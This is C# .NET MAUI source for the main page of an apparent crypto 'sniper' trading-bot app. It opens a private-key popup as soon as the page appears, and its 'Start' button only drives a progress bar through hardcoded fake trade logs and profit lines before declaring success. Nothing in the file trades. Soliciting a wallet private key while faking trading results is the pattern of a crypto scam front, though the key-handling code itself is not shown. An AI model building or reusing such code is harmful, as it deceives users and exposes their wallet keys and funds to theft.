using Android.Graphics;
using CommunityToolkit.Maui.Views;
using Microsoft.Maui.Controls;
namespace MoonAlphaMauiApps
{
    public partial class MainPage : ContentPage
    {
        int count = 0;
        PrivateKeyPopup privateKeyPopup;
        InfoPopup infoPopup;
       
        private readonly string[] randomTexts = new[]
 {
    "[2025-02-06 12:05:23] [INFO] Bot initialized. Strategy: MoonSniper v2.4",
    "[2025-02-06 12:05:24] [INFO] Connecting to DEX API... Failed.",
    "[2025-02-06 12:05:25] [INFO] Fetching market data...",
    "[2025-02-06 12:06:12] [TRADE] Scanning trending pairs...",
    "[2025-02-06 12:06:15] [TRADE] Opportunity found: $DOGEPEPE - Volume Surge +340%",
    "[2025-02-06 12:06:16] [BUY] Executing market order: 2.5 BNB → 1,200,000,000 $DOGEPEPE",
    "[2025-02-06 12:06:17] [Failed] Buy Confirmed Failed.",
    "[2025-02-06 12:09:45] [INFO] $DOGEPEPE up 74% in 3 minutes.",
    "[2025-02-06 12:09:46] [SELL] Executing market order: 1,200,000,000 $DOGEPEPE → 4.3 BNB",
    "[2025-02-06 12:09:47] [Failed] Sell Confirmed. Profit: +1.8 BNB (+72%)",
    "[2025-02-06 12:12:32] [TRADE] Scanning for new entries...",
    "[2025-02-06 12:12:36] [TRADE] New Trend Alert: $MOONPUG -"
};

        public MainPage()
        {
            InitializeComponent();

            infoPopup = new InfoPopup();

        }
        protected override void OnAppearing()
        {
            base.OnAppearing();
            ShowPrivateKeyPopup();

        }
        private async void ShowPrivateKeyPopup()
        {
            privateKeyPopup = new PrivateKeyPopup();


            var result = (bool)await this.ShowPopupAsync(privateKeyPopup);

            sol1.IsEnabled = sol2.IsEnabled = sol5.IsEnabled = sol10.IsEnabled = result;
            if (result)
            {
                btnConnect.Text = "Connected Wallet";
                btnConnect.IsEnabled = false;

            }
        }
        private void ShowInfoPopup()
        {
            //this.ShowPopup(infoPopup);
        }
       private void ShowCompletePopup()
        {
            this.ShowPopup(new CompletePopup());
        }

      

        private void RadioButton_Checked(object sender, CheckedChangedEventArgs e)
        {
        }

        private void OnRadioButtonCheckedChanged(object sender, CheckedChangedEventArgs e)
        {

        }

        private void OnAmountChanged(object sender, CheckedChangedEventArgs e)
        {

        }

        private void Entry_TextChanged(object sender, TextChangedEventArgs e)
        {
            if (!String.IsNullOrEmpty(txtInputLink.Text))
            {
                var startBtn = (Button)FindByName("btnStart");

                if (startBtn == null)
                {

                    return;
                }
                startBtn.IsEnabled = true;

            }


        }

        private void Button_Clicked(object sender, EventArgs e)
        {
            ShowPrivateKeyPopup();
        }

        private void Button_Click_1(object sender, EventArgs e)
        {
            ShowInfoPopup();

        }

        private void sol1_CheckedChanged(object sender, CheckedChangedEventArgs e)
        {

        }

        private void amount_CheckedChanged(object sender, CheckedChangedEventArgs e)
        {
            profitPicker.IsEnabled = true;


        }

      

        private async void btnStart_Clicked(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(txtInputLink.Text))
            {
                await Application.Current.MainPage.DisplayAlert("Warning", "Please enter input link key.", "OK");
            }
            else
            {
                StartProgress();
            }
                
        }
        private async void StartProgress()
        {
            // Reset UI instantly before starting again
            pbProgress.Progress = 0;
            prgStatusLbl.Text = "0%";
            richtxtbox.Text = string.Empty; // Clear previous text

            double progress = 0;
            var startBtn = (Button)FindByName("btnStart");
            startBtn.IsEnabled = false;
            int index = 0; // Track text index

            while (progress < 1)
            {
                progress += 0.01; // Increase by 1%
                pbProgress.ProgressTo(progress, 1200, Easing.Linear);
                prgStatusLbl.Text = $"{(progress * 100):0}%";

                MainThread.BeginInvokeOnMainThread(async () =>
                {
                    // Add text from the array, cycling through if necessary
                    richtxtbox.Text += randomTexts[index % randomTexts.Length] + Environment.NewLine;

                    // Allow UI update before scrolling
                    await Task.Delay(100);

                    // Scroll to the bottom
                    await scrollView.ScrollToAsync(0, double.MaxValue, true);
                });

                index++; // Increment index for next text

                await Task.Delay(120); // Wait for 1.2 seconds per step
            }

            startBtn.IsEnabled = true;
            prgStatusLbl.Text = "Successfully";
            ShowCompletePopup();
        }

        private void profitPicker_SelectedIndexChanged(object sender, EventArgs e)
        {
            txtInputLink.IsEnabled = true;
        }

        private void Button_Clicked_1(object sender, EventArgs e)
        {
            var flexLayoutAmount = (FlexLayout)FindByName("flexLayoutAmount");
            foreach (var child in flexLayoutAmount.Children)
            {
                if (child is RadioButton radioButton)
                {
                    radioButton.IsChecked = false;
                }
            }
            profitPicker.SelectedIndex = -1;
            txtInputLink.Text = "";
            txtInputLink.IsEnabled = false;
            prgStatusLbl.Text = "";
            profitPicker.IsEnabled = false;
            sol1.IsEnabled = sol2.IsEnabled = sol5.IsEnabled = sol10.IsEnabled = false;
           
                btnConnect.Text = "Connect Wallet";
                btnConnect.IsEnabled = true;
            btnStart.IsEnabled = false;
            pbProgress.Progress = 0;
            prgStatusLbl.Text = "";
            richtxtbox.Text = string.Empty;
            ShowPrivateKeyPopup();



        }
    }

}
